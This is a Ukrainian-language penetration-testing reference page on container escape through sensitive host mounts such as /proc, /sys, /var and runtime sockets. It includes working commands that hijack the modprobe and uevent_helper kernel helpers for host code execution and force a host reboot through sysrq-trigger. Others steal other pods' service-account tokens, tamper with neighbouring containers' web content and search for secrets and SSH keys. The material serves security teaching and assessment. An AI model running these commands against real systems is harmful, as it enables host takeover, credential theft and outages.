# Чутливі точки монтування хоста

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Точки монтування хоста — одна з найважливіших практичних поверхонь для container-escape, оскільки вони часто зводять ретельно ізольований вигляд процесів до прямої видимості ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, or device-related paths можуть відкривати доступ до керувань ядра, облікових даних, файлових систем сусідніх контейнерів та інтерфейсів управління runtime.

Ця сторінка існує окремо від індивідуальних сторінок захисту, оскільки модель зловживання є наскрізною. Примонтований ресурс хоста з правом запису небезпечний частково через mount namespaces, частково через user namespaces, частково через покриття AppArmor або SELinux, і частково через те, який саме шлях хоста був відкритий. Розгляд цього як окремої теми робить поверхню атаки значно простішою для аналізу.

## `/proc` — експозиція

procfs містить як звичайну інформацію про процеси, так і інтерфейси керування ядром з високим впливом. Bind mount such as `-v /proc:/host/proc` або вигляд контейнера, який відкриває несподівані writable proc entries, може призвести до розкриття інформації, відмови в обслуговуванні або прямого виконання коду на хості.

Важливі шляхи procfs включають:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Почніть з перевірки, які з перерахованих важливих записів procfs видимі або доступні для запису:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ці шляхи цікаві з різних причин. `core_pattern`, `modprobe` і `binfmt_misc` можуть стати шляхами виконання коду на host, якщо вони доступні для запису. `kallsyms`, `kmsg`, `kcore` і `config.gz` — потужні джерела reconnaissance для експлуатації kernel. `sched_debug` і `mountinfo` розкривають контекст процесів, cgroup і файлової системи, що допомагає відтворити layout host зсередини контейнера.

Практична цінність кожного шляху різна, і трактування їх усіх як рівнозначних ускладнює triage:

- `/proc/sys/kernel/core_pattern`
Якщо доступний для запису, це один із найвпливовіших procfs-шляхів, тому що kernel виконає pipe handler після краху. Контейнер, який може вказати `core_pattern` на payload, збережений в його overlay або у змонтованому host-шляху, часто може отримати host code execution. Див. також [read-only-paths.md](protections/read-only-paths.md) для прикладу.
- `/proc/sys/kernel/modprobe`
Цей шлях контролює userspace helper, який kernel використовує, коли потрібно викликати логіку завантаження модулів. Якщо він доступний для запису з контейнера і інтерпретується в контексті host, він може стати ще одним примітивом для host code execution. Особливо цікавий у поєднанні зі способом тригерити helper path.
- `/proc/sys/vm/panic_on_oom`
Зазвичай не є чистим primitive для escape, але може перетворити memory pressure у широкомасштабний denial of service на host, перетворюючи OOM-умови на kernel panic.
- `/proc/sys/fs/binfmt_misc`
Якщо інтерфейс реєстрації доступний для запису, attacker може зареєструвати handler для обраного magic value і отримати host-context execution, коли відповідний файл буде виконано.
- `/proc/config.gz`
Корисний для triage kernel-експлойтів. Допомагає визначити, які підсистеми, mitigations і опціональні kernel-функції ввімкнені без потреби у метаданих пакетів host.
- `/proc/sysrq-trigger`
Переважно шлях для denial-of-service, але дуже серйозний. Може негайно перезавантажити, викликати panic або інакше порушити роботу host.
- `/proc/kmsg`
Розкриває kernel ring buffer messages. Корисний для fingerprinting host, аналізу крашів і в деяких середовищах для leaking information, що допомагає для kernel exploitation.
- `/proc/kallsyms`
Цінний, коли читабельний, тому що відкриває інформацію про експортовані kernel symbols і може допомогти подолати припущення про address randomization під час розробки kernel-експлойтів.
- `/proc/[pid]/mem`
Це прямий інтерфейс до пам'яті процесу. Якщо цільовий процес доступний з потрібними ptrace-style умовами, це може дозволити читати або змінювати пам'ять іншого процесу. Реалістичний вплив сильно залежить від credentials, `hidepid`, Yama і ptrace-обмежень, тому це потужний, але умовний шлях.
- `/proc/kcore`
Показує вигляд системної пам'яті у стилі core-image. Файл величезний і незручний у використанні, але якщо його можна хоча б частково читати, це вказує на серйозно відкриту поверхню пам'яті host.
- `/proc/kmem` and `/proc/mem`
Історично високовпливові інтерфейси сирої пам'яті. На багатьох сучасних системах вони вимкнені або сильно обмежені, але якщо присутні і придатні до використання, їх слід вважати критичними знахідками.
- `/proc/sched_debug`
Витоку scheduling і task-інформації, що може виявляти ідентичності процесів host навіть коли інші уявлення про процеси виглядають чистішими, ніж очікувалося.
- `/proc/[pid]/mountinfo`
Надзвичайно корисний для відтворення того, де контейнер насправді розташований на host, які шляхи підтримуються overlay, і чи відповідає записуване mount вмісту host або лише шару контейнера.

Якщо `/proc/[pid]/mountinfo` або деталі overlay доступні для читання, використайте їх, щоб відновити host path файлової системи контейнера:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, тому що низка прийомів виконання на хості вимагає перетворення шляху всередині контейнера на відповідний шлях з точки зору хоста.

### Повний приклад: `modprobe` Helper Path Abuse

Якщо `/proc/sys/kernel/modprobe` доступний для запису з контейнера і helper path інтерпретується в контексті хоста, його можна перенаправити на payload під контролем нападника:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки kernel, але важливий момент у тому, що записуваний helper path може перенаправити майбутній виклик kernel helper на вміст host-path, контрольований атакуючим.

### Повний приклад: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Якщо мета — exploitability assessment, а не immediate escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають з’ясувати, чи видно корисну інформацію про символи, чи останні повідомлення ядра розкривають цікавий стан, і які функції ядра або механізми пом'якшення скомпільовані. Вплив зазвичай не призводить безпосередньо до escape, але це може істотно скоротити триаж вразливостей ядра.

### Full Example: SysRq Host Reboot

Якщо `/proc/sysrq-trigger` доступний для запису і видно з боку хоста:
```bash
echo b > /proc/sysrq-trigger
```
Наслідком є негайне перезавантаження хоста. Це не тонкий приклад, але чітко демонструє, що доступ до procfs може бути набагато серйознішим за розкриття інформації.

## `/sys` Експозиція

sysfs відкриває великий обсяг стану ядра та пристроїв. Деякі шляхи sysfs переважно корисні для fingerprinting, тоді як інші можуть впливати на виконання helper, поведінку пристроїв, конфігурацію security-module або стан прошивки.

Високовартісні шляхи sysfs включають:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку thermal-management і, отже, на стабільність хоста в слабо захищених середовищах. `/sys/kernel/vmcoreinfo` може leak crash-dump і kernel-layout інформацію, що допомагає з низькорівневим host fingerprinting. `/sys/kernel/security` — це інтерфейс `securityfs`, який використовують Linux Security Modules, тому неочікуваний доступ туди може expose або змінити стан, пов'язаний з MAC. Шляхи EFI-перемінних можуть впливати на firmware-backed boot налаштування, роблячи їх набагато серйознішими за звичайні конфігураційні файли. `debugfs` під `/sys/kernel/debug` особливо небезпечний, оскільки це навмисно інтерфейс для розробників з набагато меншими очікуваннями безпеки, ніж загартовані production-facing kernel APIs.

Корисні команди для перегляду цих шляхів:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Чому ці команди цікаві:

- `/sys/kernel/security` може виявити, чи AppArmor, SELinux або інший LSM доступні/видимі таким чином, що вони мали залишатися тільки на хості.
- `/sys/kernel/debug` часто є найтривожнішим результатом у цій групі. Якщо debugfs змонтовано і доступний для читання або запису, очікуйте широкої площини доступу до ядра, точний ризик якої залежить від увімкнених debug nodes.
- EFI variable exposure зустрічається рідше, але якщо присутнє — має великий вплив, оскільки стосується налаштувань, збережених у прошивці, а не звичайних файлів часу виконання.
- `/sys/class/thermal` головним чином стосується стабільності хоста та взаємодії з апаратним забезпеченням, а не для зручного переходу в shell.
- `/sys/kernel/vmcoreinfo` переважно є джерелом для ідентифікації хоста і аналізу збоїв, корисним для розуміння низькорівневого стану ядра.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, ядро може виконати helper, контрольований атакувальником, коли спрацьовує `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Причина, чому це працює, полягає в тому, що шлях помічника інтерпретується з точки зору хоста. Після активації помічник виконується в контексті хоста, а не всередині поточного контейнера.

## Експозиція `/var`

Підключення `/var` хоста до контейнера часто недооцінюють, бо воно не виглядає так драматично, як підключення `/`. Насправді цього часто достатньо, щоб дістатися до runtime-сокетів, каталогів знімків контейнерів, томів pod, керованих kubelet, projected service-account tokens та файлових систем сусідніх додатків. На сучасних нодах `/var` часто містить найбільш операційно цікаві стани контейнерів.

### Kubernetes Example

Pod з `hostPath: /var` часто може читати projected tokens інших pod'ів та вміст overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, бо відповідають, чи примонтований том відкриває лише звичайні дані додатка, чи high-impact cluster credentials. Читабельний service-account token може негайно перетворити local code execution на доступ до Kubernetes API.

Якщо token присутній, перевірте, до чого він має доступ, замість того щоб зупинятися на token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
The impact here may be much larger than local node access. A token with broad RBAC can turn a mounted `/var` into cluster-wide compromise.

### Docker And containerd — приклад

Наслідки тут можуть бути набагато більшими, ніж просто доступ до локального вузла. Токен з широкими правами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` відкриває доступ до записуваного вмісту знімка іншого навантаження, зловмисник може змінювати файли додатку, розміщувати веб‑вміст або змінювати скрипти запуску, не торкаючись поточної конфігурації контейнера.

Конкретні ідеї зловживань після виявлення записуваного вмісту знімка:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ці команди корисні, тому що вони показують три основні сімейства впливу змонтованого `/var`: application tampering, secret recovery, і lateral movement into neighboring workloads.

## Runtime Sockets

Sensitive host mounts часто включають runtime sockets замість повних директорій. Вони настільки важливі, що заслуговують на явне повторення тут:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Див. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) для повних сценаріїв експлуатації після монтування одного з цих sockets.

Як швидкий приклад першої взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із них вдасться, шлях від "mounted socket" до запуску більш привілейованого сусіднього контейнера зазвичай набагато коротший, ніж будь-який шлях виходу з ядра.

## Mount-Related CVEs

Монтування на хості також перетинається з уразливостями runtime. Важливі недавні приклади включають:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.

Ці CVE важливі тут, оскільки показують, що обробка mount-ів — це не лише конфігурація оператора. Сам runtime також може вводити mount-driven escape conditions.

## Checks

Використовуйте ці команди, щоб швидко виявити найбільш критичні експозиції монтованих ресурсів:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Корінь хоста, `/proc`, `/sys`, `/var` та runtime sockets — усе це знахідки високого пріоритету.
- Доступ на запис до записів proc/sys часто означає, що монтування відкриває глобальні механізми керування ядром хоста замість безпечного подання контейнера.
- Замонтовані шляхи `/var` заслуговують на перевірку облікових даних та сусідніх робочих навантажень, а не лише перевірку файлової системи.
{{#include ../../../banners/hacktricks-training.md}}
